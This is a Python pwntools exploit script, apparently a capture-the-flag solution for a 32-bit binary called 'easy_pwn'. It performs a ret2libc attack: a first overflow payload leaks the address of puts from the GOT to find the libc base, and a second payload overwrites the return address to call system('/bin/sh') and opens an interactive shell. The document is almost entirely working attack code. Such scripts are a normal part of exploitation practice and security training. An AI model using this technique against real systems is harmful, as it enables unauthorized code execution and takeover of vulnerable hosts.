# encoding:utf-8
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = 'easy_pwn'
e = ELF(file)
libc = e.libc
rlibc = ''
ip = ''
port = ''
debug = False


def dbg(code=""):
    global debug
    if debug == False:
        return
    gdb.attach(p, code)


def run(local):
    global p, libc, debug
    if local == 1:
        debug = True
        p = process(file)
    else:
        p = remote(ip, port)
        debug = False
        libc = ELF(rlibc)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run(1)

rc()
#
payload = 'I' * 0x10 + p32(e.plt['puts']) + p32(0x80492F5) + p32(e.got['puts'])
se(payload)
rn(0x70)
libc.address = un32(rn(4)) - libc.symbols['puts']
print hex(libc.address)
dbg('b*0x080492F4')
payload = 'I' * 0x10 + p32(libc.symbols['system']) + p32(0x80492F5) + p32(next(libc.search('/bin/sh')))
se(payload)
shell()